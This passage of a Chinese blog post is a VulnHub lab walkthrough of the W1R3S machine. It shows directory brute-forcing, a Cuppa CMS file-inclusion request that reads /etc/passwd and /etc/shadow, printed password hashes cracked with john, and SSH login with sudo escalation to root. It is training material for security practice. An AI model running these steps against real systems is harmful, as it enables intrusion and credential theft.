+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span><br><span class="line">&quot;|base64 -d</span><br><span class="line">It is easy, but not that easy..</span><br></pre></td></tr></table></figure>
+
+<p>左脑攻击右脑 </p>
+<p>The W1R3S.inc employee list</p>
+<p>Naomi.W - Manager<br>Hector.A - IT Dept<br>Joseph.G - Web Design<br>Albert.O - Web Design<br>Gina.L - Inventory<br>Rico.D - Human Resources</p>
+<p>员工信息 待会说不定有用这里分好了职位</p>
+<p>好了ftp就是这些信息</p>
+<p>对80端口进行测试</p>
+<p>web页面没发现有用的东西</p>
+<p>爆破目录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gobuster dir -u http://192.168.205.136 --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;wordpress            (Status: 301) [Size: 322] [–&gt; <a target="_blank" rel="noopener" href="http://192.168.205.136/wordpress/]">http://192.168.205.136/wordpress/]</a><br>&#x2F;javascript           (Status: 301) [Size: 323] [–&gt; <a target="_blank" rel="noopener" href="http://192.168.205.136/javascript/]">http://192.168.205.136/javascript/]</a><br>&#x2F;administrator        (Status: 301) [Size: 326] [–&gt; <a target="_blank" rel="noopener" href="http://192.168.205.136/administrator/]">http://192.168.205.136/administrator/]</a><br>&#x2F;server-status        (Status: 403) [Size: 303]</p>
+<p>amdinistrator可以直接进入 是个cms</p>
+<p>wordpress进行一个跳转 到localhost&#x2F;wordpress&#x2F;</p>
+<p>这里不确定是不是kali环境问题所以先对另一个cms进行测试</p>
+<p>测试出来发现不能进行安装</p>
+<p>查看历史漏洞</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">earchsploit cuppa    </span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line"> Exploit Title                                                                                                                                             |  Path</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line">Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion                                                                                            | php/webapps/25971.txt</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
+
+<p>发现25971 给他下载下来</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">earchsploit cuppa -m 25971</span><br><span class="line">[!] Could not find EDB-ID #</span><br><span class="line"></span><br><span class="line">  Exploit: Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/25971</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br><span class="line">    Codes: OSVDB-94101</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C++ source, ASCII text, with very long lines (876)</span><br><span class="line">Copied to: /home/kali/Desktop/w1r3s/25971.txt</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现利用方式是文件包含我们看他给的payload能不能测试成功</p>
+<p>发现是不行的 </p>
+<p>蒋cuppr那修改下 成administrator</p>
+<p>发现是由回显但是没有爆出内容</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.205.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.205.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p>
+<p>这个时候考虑是不是利用POST的或是其他的东西 </p>
+<p>curl –data-urlencode “urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>“ <a target="_blank" rel="noopener" href="http://192.168.205.136/administrator/alerts/alertConfigField.php">http://192.168.205.136/administrator/alerts/alertConfigField.php</a></p>
+<p>发现列出passwd 信息</p>
+<p>那么我们可以进一步查看shadow</p>
+<p>得到密码进行筛选有哈希值的账户</p>
+<p>root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx.&#x2F;ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</p>
+<p>www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8&#x2F;0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</p>
+<p>w1r3s:$6$xe&#x2F;eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb&#x2F;io7x9q1iP.:17567:0:99999:7:::</p>
+<p>得到这些 我们进行对哈希进行解密</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john md5.hash </span><br><span class="line">Created directory: /home/kali/.john</span><br><span class="line">Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;HMAC-SHA256&quot;</span><br><span class="line">Use the &quot;--format=HMAC-SHA256&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">www-data         (www-data)     </span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">computer         (w1r3s)     </span><br><span class="line">Proceeding with incremental:ASCII</span><br></pre></td></tr></table></figure>
+
+<p>进行ssh远程登录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ssh w1r3s@192.168.205.136</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Think this is the way?</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Well,........possibly.</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">w1r3s@192.168.205.136&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">108 packages can be updated.</span><br><span class="line">6 updates are security updates.</span><br><span class="line"></span><br><span class="line">.....You made it huh?....</span><br><span class="line">Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35</span><br></pre></td></tr></table></figure>
+
+<p>登录成功可以直接sudo提权</p>
+<p>获取flag</p>
+<h2 id="root-W1R3S-cat-flag-txt"><a href="#root-W1R3S-cat-flag-txt" class="headerlink" title="root@W1R3S:~# cat flag.txt "></a>root@W1R3S:~# cat flag.txt </h2><hr>
+<h2 id=""><a href="#" class="headerlink" title="  &#x2F; _&#x2F; _ | \ | |&#x2F; _|  _ \    &#x2F; |   | | | | |      &#x2F; |   | _&#x2F; _ | \ | &#x2F; _| | |  | | | |  | | |  | |) |  &#x2F; _ \ | | | | | | |     &#x2F; _ \ | |  | | | | |  | __ \ | || || | |\  | || |  _ &lt;  &#x2F; ___ | | | |_| | |_ &#x2F; ___ | |  | | || | |\  |) |  ____&#x2F;|| _|__|| _/_&#x2F;   __|  _&#x2F;|_____&#x2F;&#x2F;   __| |_&#x2F;|| _|____&#x2F; 
+                                                                                        "></a>  &#x2F; <strong>_&#x2F; _ | \ | |&#x2F; <em>_<em>|  _ \    &#x2F; |</em>   <em>| | | | |      &#x2F; |</em>   <em>|</em> _&#x2F; _ | \ | &#x2F; <em>_<em>|<br> | |  | | | |  | | |  <em>| |</em>) |  &#x2F; _ \ | | | | | | |     &#x2F; _ \ | |  | | | | |  | _</em>_ \<br> | |</em><em>| |</em>| | |\  | |</em>| |  _ &lt;  &#x2F; ___ | | | |_| | |</strong>_ &#x2F; ___ | |  | | |<em>| | |\  |</em><strong>) |<br>  _</strong><em>___&#x2F;|</em>| _|_<em>_<em>|</em>| _/_&#x2F;   __|  _</em><em>&#x2F;|_____&#x2F;</em>&#x2F;   __| |<em><strong>_</strong>&#x2F;|</em>| _|____&#x2F; 
+                                                                                        </h2><pre><code>                      .-----------------TTTT_-----_______
+                    /&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;(______O] ----------____  \______/]_
+ __...---&#39;&quot;&quot;&quot;\_ --&#39;&#39;   Q                               ___________@
+</code></pre>
+<p> |’’’                   ._   _______________&#x3D;———“””””””<br> |                ..–’’|   l L |_l   |<br> |          ..–’’      .  &#x2F;-_<strong>j ‘   ‘<br> |    ..–’’           &#x2F;  ,       ‘   ‘<br> |–’’                &#x2F;           &#96;    <br>                      L</strong>‘         \    -<br>                                    -    ‘-.<br>                                     ‘.    &#x2F;<br>                                       ‘-.&#x2F;</p>
+<hr>
+<h2 id="YOU-HAVE-COMPLETED-THE-INC-CHALLENGE-V-1-0"><a href="#YOU-HAVE-COMPLETED-THE-INC-CHALLENGE-V-1-0" class="headerlink" title="  YOU HAVE COMPLETED THE               __      __  ______________________   _________              &#x2F;  \    &#x2F;  /_   ______   _____  \ &#x2F;   &#x2F;              \   //   &#x2F; |   ||       &#x2F; (  &lt; __  \               \        &#x2F;  |   ||    |   /       /                        __&#x2F;\  &#x2F;   ||||  &#x2F;____  &#x2F;_______  &#x2F;.INC                     /                /       /        /        CHALLENGE, V 1.0"></a>  YOU HAVE COMPLETED THE<br>               __      __  ______________________   _________<br>              &#x2F;  \    &#x2F;  /_   ______   _____  \ &#x2F;   <strong><em><strong>&#x2F;<br>              \   //   &#x2F; |   ||       <em>&#x2F; <em>(</em></em>  &lt; _</strong></em>_  \<br>               \        &#x2F;  |   ||    |   /       /        <br>                __&#x2F;\  &#x2F;   |</strong><em>||</em><strong><em>|</em>  &#x2F;</strong>____  &#x2F;_______  &#x2F;.INC<br>                     /                /       /        /        CHALLENGE, V 1.0</h2><p>CREATED BY SpecterWires</p>
+<hr>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Gu0f3n.github.io">Gu0f3n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://gu0f3n.github.io/2025/03/25/W1R3S%201.0.1/">https://gu0f3n.github.io/2025/03/25/W1R3S%201.0.1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Gu0f3n.github.io" target="_blank">Gu0f3n's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/Gu0f3n/img/mian/微信图片_20250325162730.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/03/24/cc6/" title="cc6"><img class="cover" src="https://raw.githubusercontent.com/Gu0f3n/img/mian/c056efc3f6d31229615539c9584b9949.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">cc6</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/02/16/vulnhub-DC-1/" title="vulnhub DC-1"><img class="cover" src="/img/3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-16</div><div class="title">vulnhub DC-1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Gu0f3n</div><div class="author-info__description">石匠敲击石头的101次</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Gu0f3n?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Gu0f3n?tab=repositories" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://weibo.com/u/3833024804" target="_blank" title="microblog"><i class="fa-brands fa-microblog" style="color: #FF0000;"></i></a><a class="social-icon" href="https://space.bilibili.com/282616786?spm_id_from=333.337.0.0" target="_blank" title="Bilibili"><i class="fa-brands fa-bilibili" style="color: #FFC0CB;"></i></a><a class="social-icon" href="https://www.douyin.com/user/MS4wLjABAAAA13z3eSKpDESynATlUFIUGCPdSHi7oID9u2rz2bHH6aE" target="_blank" title="tiktok"><i class="fa-brands fa-tiktok" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#root-W1R3S-cat-flag-txt"><span class="toc-number">1.</span> <span class="toc-text">root@W1R3S:~# cat flag.txt </span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">  &#x2F; _&#x2F; _ | \ | |&#x2F; _|  _ \    &#x2F; |   | | | | |      &#x2F; |   | _&#x2F; _ | \ | &#x2F; _| | |  | | | |  | | |  | |) |  &#x2F; _ \ | | | | | | |     &#x2F; _ \ | |  | | | | |  | __ \ | || || | |\  | || |  _ &lt;  &#x2F; ___ | | | |_| | |_ &#x2F; ___ | |  | | || | |\  |) |  ____&#x2F;|| _|__|| _&#x2F;_&#x2F;   __|  _&#x2F;|_____&#x2F;&#x2F;   __| |_&#x2F;|| _|____&#x2F; 
+                                                                                        </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#YOU-HAVE-COMPLETED-THE-INC-CHALLENGE-V-1-0"><span class="toc-number">3.</span> <span class="toc-text">  YOU HAVE COMPLETED THE               __      __  ______________________   _________              &#x2F;  \    &#x2F;  &#x2F;_   ______   _____  \ &#x2F;   &#x2F;              \   &#x2F;&#x2F;   &#x2F; |   ||       &#x2F; (  &lt; __  \               \        &#x2F;  |   ||    |   &#x2F;       &#x2F;                        __&#x2F;\  &#x2F;   ||||  &#x2F;____  &#x2F;_______  &#x2F;.INC                     &#x2F;                &#x2F;       &#x2F;        &#x2F;        CHALLENGE, V 1.0</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/25/W1R3S%201.0.1/" title="lW1R3S 1.0.1"><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/微信图片_20250325162730.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="lW1R3S 1.0.1"/></a><div class="content"><a class="title" href="/2025/03/25/W1R3S%201.0.1/" title="lW1R3S 1.0.1">lW1R3S 1.0.1</a><time datetime="2025-03-25T08:24:26.000Z" title="发表于 2025-03-25 16:24:26">2025-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/24/cc6/" title="cc6"><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/c056efc3f6d31229615539c9584b9949.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="cc6"/></a><div class="content"><a class="title" href="/2025/03/24/cc6/" title="cc6">cc6</a><time datetime="2025-03-24T11:21:15.000Z" title="发表于 2025-03-24 19:21:15">2025-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/23/URLDNS/" title="URLDNS"><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/微信图片_20250323160357.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS"/></a><div class="content"><a class="title" href="/2025/03/23/URLDNS/" title="URLDNS">URLDNS</a><time datetime="2025-03-23T08:02:24.000Z" title="发表于 2025-03-23 16:02:24">2025-03-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%9D%E6%8E%A2/" title="内网穿透初探"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网穿透初探"/></a><div class="content"><a class="title" href="/2025/03/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%9D%E6%8E%A2/" title="内网穿透初探">内网穿透初探</a><time datetime="2025-03-21T05:07:31.000Z" title="发表于 2025-03-21 13:07:31">2025-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/19/cc1%E5%88%86%E6%9E%90/" title="cc1分析"><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image-1725933602516-333.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="cc1分析"/></a><div class="content"><a class="title" href="/2025/03/19/cc1%E5%88%86%E6%9E%90/" title="cc1分析">cc1分析</a><time datetime="2025-03-19T11:48:51.000Z" title="发表于 2025-03-19 19:48:51">2025-03-19</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://raw.githubusercontent.com/Gu0f3n/img/mian/微信图片_20250325162730.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Gu0f3n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>(() => {
+  const panguFn = () => {
+    if (typeof pangu === 'object') pangu.autoSpacingPage()
+    else {
+      btf.getScript('https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js')
+        .then(() => {
+          pangu.autoSpacingPage()
+        })
+    }
+  }
+
+  const panguInit = () => {
+    if (false){
+      GLOBAL_CONFIG_SITE.isPost && panguFn()
+    } else {
+      panguFn()
+    }
+  }
+
+  btf.addGlobalFn('pjaxComplete', panguInit, 'pangu')
+  document.addEventListener('DOMContentLoaded', panguInit)
+})()</script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><div class="aplayer no-destroy" data-id="12384198565" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><div class="fb-customerchat" id="fb-customer-chat" attribution="biz_inbox"></div><script>(() => {
+  document.getElementById('fb-root') ? '' : document.body.insertAdjacentHTML('afterend', '<div id="fb-root"></div>')
+
+  window.fbAsyncInit = function() {
+    FB.init({
+      xfbml: true,
+      version: 'v16.0'
+    });
+  };
+
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = 'https://connect.facebook.net/zh_CN/sdk/xfbml.customerchat.js';
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+
+  const isChatBtn = false
+  const isChatHideShow = false
+
+  if (isChatBtn) {
+    window.chatBtnFn = () => {
+      const isShow = document.querySelector('.fb_customer_chat_bounce_in_v2')
+      isShow ? FB.CustomerChat.hide() : FB.CustomerChat.show()
+    }
+  } else if (isChatHideShow) {
+    window.chatBtn = {
+      hide: () => {
+        FB.CustomerChat.hide()
+      },
+      show: () => {
+        FB.CustomerChat.show(false)
+      }
+    }
+  }
+})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const loadMeting = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'loadMeting')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+const triggerPjaxFn = (val) => {
+  if (!val) return
+  Object.values(val).forEach(fn => { fn() })
+}
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  triggerPjaxFn(window.globalFn.pjaxSend)
+})
+
+document.addEventListener('pjax:complete', () => {
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  triggerPjaxFn(window.globalFn.pjaxComplete)
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.14.0-b3"></script></div></div></body></html>
